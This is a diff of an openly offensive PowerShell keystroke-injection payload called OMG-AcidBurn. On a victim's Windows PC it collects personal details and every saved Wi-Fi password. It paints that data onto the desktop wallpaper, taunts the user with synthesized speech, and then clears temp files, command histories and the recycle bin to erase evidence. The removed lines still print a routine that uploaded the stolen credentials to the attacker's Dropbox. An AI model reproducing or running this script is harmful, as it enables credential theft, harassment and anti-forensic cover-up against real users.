@@ -1,12 +1,12 @@
 ############################################################################################################################################################                      
 #                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
-# Title        : OMG-iRoast        | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
+# Title        : OMG-AcidBurn      | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
 # Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
 # Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
 # Category     : Prank/Recon       | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
 # Target       : Windows 7,10,11   |                                                                   |___/ #           /\/|_      __/\\                  #     
 # Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
-# Dependencies : DropBox           |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
+#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
 #                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
 #                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
 #__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
@@ -14,12 +14,12 @@
 #  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
 #  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
 #  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
-#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
+#  youtube.com/c/IamJakoby        (youtube link with demonstration coming soon)                              #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
 ############################################################################################################################################################
 
 <#
 .NOTES
-	This script was not optomized to shorten the code. This script is intended to have as much readablility as possible for new coders to learn. 
+	This script was not optimized to shorten the code. This script is intended to have as much readablility as possible for new coders to learn. 
 
 .DESCRIPTION 
 	This program gathers details from target PC to include Operating System, RAM Capacity, Public IP, and Email associated with microsoft account.
@@ -27,36 +27,24 @@
 	It determines the last day they changed thier password and how many days ago.
 	Once the information is gathered the script will pause until a mouse movement is detected
 	Then the script uses Sapi speak to roast their set up and lack of security
-	Additionally you have the option to upload their info to your DropBox Cloud storage.
-
-.LINK 
-	This is the link you go to after signing into your DropBox account to make an App for uploading files to the DropBox Cloud Storage
-	https://www.dropbox.com/developers/apps
-
-	This link is the guide for how you get your DropBox Access Token for uploading files to your cloud storage
-	https://developers.dropbox.com/oauth-guide
 #>
 ############################################################################################################################################################
 
 # Variables
 
-# Add your own DropBox access Token to the variable below 
-$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"
 
-# if popup = 1 a popup will be displayed before freezing the script while waiting for the cursor to move to continue the script
-# else capslock light will blink as an indicator
-$popup = 1
-$popmessage = "System updated successfully"
+$s=New-Object -ComObject SAPI.SpVoice
 
 ############################################################################################################################################################
+
 # Intro ---------------------------------------------------------------------------------------------------
- function Get-Intro {
+ function Get-fullName {
 
     try {
 
     $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
 
-    $NameArray =$fullName.Split(" ")
+    #$NameArray =$fullName.Split(" ")
 
     #$firstName = $NameArray[0]
 
@@ -72,9 +60,11 @@ $popmessage = "System updated successfully"
     -ErrorAction SilentlyContinue
     }
 
-    return " $fullName , it has been a long time my friend  "
+    return $fullName 
 
 }
+
+$fullName = Get-fullName
 
 # echo statement used to track progress while debugging
 echo "Intro Done"
@@ -84,12 +74,12 @@ echo "Intro Done"
 <#
 
 .NOTES 
-	Basic Info
-	This will get basic spec information on the target computer such a Operating System and RAM
+	RAM Info
+	This will get the amount of RAM the target computer has
 #>
 
 
-function Get-BasicInfo {
+function Get-RAM {
 
     try {
 
@@ -101,11 +91,11 @@ function Get-BasicInfo {
 
 # ENTER YOUR CUSTOM RESPONSES HERE
 #----------------------------------------------------------------------------------------------------
-    $lowRAM = "$RAM gigs of ram? thats pretty low"
+    $lowRAM = "$RAM gigs of ram? might as well use pen and paper"
     
     $okRAM = "$RAM gigs of ram really? I have a calculator with more computing power"
     
-    $goodRAM = "$RAM gigs of ram? That is not terrible I guess"
+    $goodRAM = "$RAM gigs of ram? Can almost guarantee you have a light up keyboard.. you are a wanna be streamer huh?"
 
     $impressiveRAM = "$RAM gigs of ram? are you serious? a super computer with no security that is funny right there"
 #----------------------------------------------------------------------------------------------------
@@ -132,7 +122,7 @@ function Get-BasicInfo {
 }
 
 # echo statement used to track progress while debugging
-echo "Basic Info Done"
+echo "RAM Info Done"
 
 ###########################################################################################################
 
@@ -274,6 +264,116 @@ Foreach($WLANProfileName in $WLANProfileNames){
     $WLANProfileObjects += $WLANProfileObject
     Remove-Variable WLANProfileObject
 }
+
+
+#############################################################################################################################################
+
+<#
+
+.NOTES 
+	This will get the dimension of the targets screen to make the wallpaper
+#>
+
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class PInvoke {
+    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
+    [DllImport("gdi32.dll")] public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
+}
+"@
+$hdc = [PInvoke]::GetDC([IntPtr]::Zero)
+$w = [PInvoke]::GetDeviceCaps($hdc, 118) # width
+$h = [PInvoke]::GetDeviceCaps($hdc, 117) # height
+
+#############################################################################################################################################
+
+<#
+
+.NOTES 
+	This will take the image you generated and set it as the targets wall paper
+#>
+
+Function Set-WallPaper {
+ 
+<#
+ 
+    .SYNOPSIS
+    Applies a specified wallpaper to the current user's desktop
+    
+    .PARAMETER Image
+    Provide the exact path to the image
+ 
+    .PARAMETER Style
+    Provide wallpaper style (Example: Fill, Fit, Stretch, Tile, Center, or Span)
+  
+    .EXAMPLE
+    Set-WallPaper -Image "C:\Wallpaper\Default.jpg"
+    Set-WallPaper -Image "C:\Wallpaper\Background.jpg" -Style Fit
+  
+#>
+
+ 
+param (
+    [parameter(Mandatory=$True)]
+    # Provide path to image
+    [string]$Image,
+    # Provide wallpaper style that you would like applied
+    [parameter(Mandatory=$False)]
+    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
+    [string]$Style
+)
+ 
+$WallpaperStyle = Switch ($Style) {
+  
+    "Fill" {"10"}
+    "Fit" {"6"}
+    "Stretch" {"2"}
+    "Tile" {"0"}
+    "Center" {"0"}
+    "Span" {"22"}
+  
+}
+ 
+If($Style -eq "Tile") {
+ 
+    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
+    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
+ 
+}
+Else {
+ 
+    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
+    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
+ 
+}
+ 
+Add-Type -TypeDefinition @" 
+using System; 
+using System.Runtime.InteropServices;
+  
+public class Params
+{ 
+    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
+    public static extern int SystemParametersInfo (Int32 uAction, 
+                                                   Int32 uParam, 
+                                                   String lpvParam, 
+                                                   Int32 fuWinIni);
+}
+"@ 
+  
+    $SPI_SETDESKWALLPAPER = 0x0014
+    $UpdateIniFile = 0x01
+    $SendChangeEvent = 0x02
+  
+    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
+  
+    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
+}
+
+#############################################################################################################################################
+
+	
     if (!$WLANProfileObjects) { Write-Host "variable is null" 
     }else { 
 
@@ -284,12 +384,66 @@ Foreach($WLANProfileName in $WLANProfileNames){
 	"W-Lan profiles: 
 	=================================================================="+ ($WLANProfileObjects| Out-String) >> $Env:temp\$FileName
 
+	$content = [IO.File]::ReadAllText("$Env:temp\$FileName")
+
+
+#############################################################################################################################################
+
+# this is the message that will be coded into the image you use as the wallpaper
+
+	$hiddenMessage = "`n`nMy crime is that of curiosity `nand yea curiosity killed the cat `nbut satisfaction brought him back `n with love -Jakoby"
+
+# this will be the name of the image you use as the wallpaper
+
+	$ImageName = "dont-be-suspicious"
+
+#############################################################################################################################################
+
+<#
+
+.NOTES  
+	This will get take the information gathered and format it into a .jpg
+#>
+
+	Add-Type -AssemblyName System.Drawing
+
+	$filename = "$env:tmp\foo.jpg" 
+	$bmp = new-object System.Drawing.Bitmap $w,$h 
+	$font = new-object System.Drawing.Font Consolas,18 
+	$brushBg = [System.Drawing.Brushes]::White 
+	$brushFg = [System.Drawing.Brushes]::Black 
+	$graphics = [System.Drawing.Graphics]::FromImage($bmp) 
+	$graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height) 
+	$graphics.DrawString($content,$font,$brushFg,500,100) 
+	$graphics.Dispose() 
+	$bmp.Save($filename) 
+
+# Invoke-Item $filename 
+
+#############################################################################################################################################
+
+<#
+
+.NOTES 
+	This will take your hidden message and use steganography to hide it in the image you use as the wallpaper 
+	Then it will clean up the files you don't want to leave behind
+#>
+
+	echo $hiddenMessage > $Env:temp\foo.txt
+	cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName.jpg"
+
+	rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
+
+
+#############################################################################################################################################
+
 
 # This is a function that will open up notepad with all their saved networks and passwords and taunt them
 
 	function Get-All_Pwds {
     		$s.Speak("wanna see something really cool?")
-    		notepad $Env:temp\$FileName
+		Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
+    		#notepad $Env:temp\$FileName
     		$s.Speak("Look at all your other passswords I got..")
     		Start-Sleep -Seconds 1
     		$s.Speak("These are the wifi passwords for every network you've ever connected to!")
@@ -297,38 +451,11 @@ Foreach($WLANProfileName in $WLANProfileNames){
     		$s.Speak("I could send them to myself but i wont")
     		#taskkill /im notepad.exe /f
     	}
-
+}
 
 # echo statement used to track progress while debugging
 echo "All Wifi Passes Done"
 
-###########################################################################################################
-
-<#
-
-.NOTES 
-	Upload txt file containing Network names and Passwords to dropbox
-
-	this is the link you go to after signing into your DropBox account to make an App for uploading files to
-	https://www.dropbox.com/developers/apps
-
-	this link is the guide for how you get your DropBox Access Token for uploading files to your cloud storage
-	https://developers.dropbox.com/oauth-guide
-#>
-
-#----------------------------------------------------------------------------------------------------------
-
-	$TargetFilePath="/$FileName"
-	$SourceFilePath="$env:TMP\$FileName"
-	$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-	$authorization = "Bearer " + $DropBoxAccessToken
-	$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-	$headers.Add("Authorization", $authorization)
-	$headers.Add("Dropbox-API-Arg", $arg)
-	$headers.Add("Content-Type", 'application/octet-stream')
-	Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-
-    }
 ###########################################################################################################
 
 <#
@@ -347,7 +474,7 @@ echo "All Wifi Passes Done"
 
     try {
  
-    $pls = net user micha | Select-String -Pattern "Password last" ; $pls = [string]$pls
+    $pls = net user $env:UserName | Select-String -Pattern "Password last" ; $pls = [string]$pls
     $plsPOS = $pls.IndexOf("e")
     $pls = $pls.Substring($plsPOS+2).Trim()
     $pls = $pls -replace ".{3}$"
@@ -417,10 +544,10 @@ function Get-email {
         
 # ENTER YOUR CUSTOM RESPONSES HERE
 #----------------------------------------------------------------------------------------------------
-    $gmailResponse = "we should be friends. If you are down just email me back, ill message you at $email. That is your email right?"
-    $yahooResponse = "really?. you have a yahoo account"
-    $hotmailResponse = "really?. you have a yahoo account"
-    $otherEmailResponse = "this is a test"
+    $gmailResponse = "At least you use G Mail.. we should be friends. If you are down just email me back, ill message you at $email. That is your email right?"
+    $yahooResponse = "a yahoo account seriously? you are either in your 50's or just got done doing some time, a lot of it.. $email .. this is sad"
+    $hotmailResponse = "really?. you have a hotmail account? $email .. I am sending this to the f b I they need to check your hard drive"
+    $otherEmailResponse = "I dead ass do not even know what this is.. $email .. hope you did not think it was safe"
 #----------------------------------------------------------------------------------------------------
 
     if($email -like '*gmail*') { return $gmailResponse
@@ -446,11 +573,9 @@ echo "Email Done"
 	This function will run all the previous functions and assign their outputs to variables
 #>
 
-$fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
-
 $intro = "$fullName , it has been a long time my friend"
 
-$BASICwarn = Get-BasicInfo  
+$RAMwarn = Get-RAM  
 
 $PUB_IPwarn = Get-PubIP  
 
@@ -460,7 +585,7 @@ $LAST_PASSwarn =  Get-Days_Set
 
 $EMAILwarn = Get-email 
 
-$OUTRO =  "Laterrrr $fullName ..... p  s  i left my contact details on your desktop."
+$OUTRO =  "My crime is that of curiosity.... 	and yea curiosity killed the cat....     but satisfaction brought him back.... later $fullName"
 
 # echo statement used to track progress while debugging
 echo "Speak Variables set"
@@ -469,7 +594,7 @@ echo "Speak Variables set"
 
 # This turns the volume up to max level--------------------------------------------------------------------
 
-$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
+#$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
 
 # echo statement used to track progress while debugging
 echo "Volume to max level"
@@ -479,18 +604,23 @@ echo "Volume to max level"
 <#
 
 .NOTES 
-	This will display a pop up window for however many seconds you put to indicate the script is ready
+	These two snippets are meant to be used as indicators to let you know the script is set up and ready
+	This will display a pop up window saying "hello $fullname"
 	Or this makes the CapsLock indicator light blink however many times you set it to
 	if you do not want the ready notice to pop up or the CapsLock light to blink comment them out below
 #>
 
-    if($popup -eq 1) { $readyNotice = New-Object -ComObject Wscript.Shell;$readyNotice.Popup($popmessage)
+# a popup will be displayed before freezing the script while waiting for the cursor to move to continue the script
+# else capslock light will blink as an indicator
+$popmessage = "Hello $fullName"
 
-    }else { 
-	# caps lock indicator light
-	$blinks = 3
-	$o=New-Object -ComObject WScript.Shell;for ($num = 1 ; $num -le $blinks*2; $num++){$o.SendKeys("{CAPSLOCK}");Start-Sleep -Milliseconds 250}
-    }
+
+$readyNotice = New-Object -ComObject Wscript.Shell;$readyNotice.Popup($popmessage)
+
+
+# caps lock indicator light
+$blinks = 3;$o=New-Object -ComObject WScript.Shell;for ($num = 1 ; $num -le $blinks*2; $num++){$o.SendKeys("{CAPSLOCK}");Start-Sleep -Milliseconds 250}
+
 
 
 #-----------------------------------------------------------------------------------------------------------
@@ -519,6 +649,7 @@ $originalPOS = [System.Windows.Forms.Cursor]::Position.X
             $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
         }
     }
+echo "it worked"
 
 ###########################################################################################################
 
@@ -532,7 +663,7 @@ $s.Rate = -1
 
 $s.Speak($intro)
 
-$s.Speak($BASICwarn)
+$s.Speak($RAMwarn)
 
 $s.Speak($PUB_IPwarn)
 
@@ -550,10 +681,16 @@ $s.Speak($OUTRO)
 
 # this snippet will leave a message on your targets desktop 
 
-$message = "`nMy crime is that of curiosity `nand yea curiosity killed the cat `nbut satisfaction brought him back `n with love -Jakoby"
+$message = "`nMy crime is that of curiosity `nand yea curiosity killed the cat `nbut satisfaction brought him back"
 
-Add-Content $home\Desktop\HackerContact.txt $message
+Add-Content $home\Desktop\WithLove.txt $message
 ###########################################################################################################
+
+<#
+
+.NOTES 
+	This is to clean up behind you and remove any evidence to prove you were there
+#>
 
 # Delete contents of Temp folder 
 
@@ -566,6 +703,10 @@ reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\
 # Delete powershell history
 
 Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 ###########################################################################################################
 
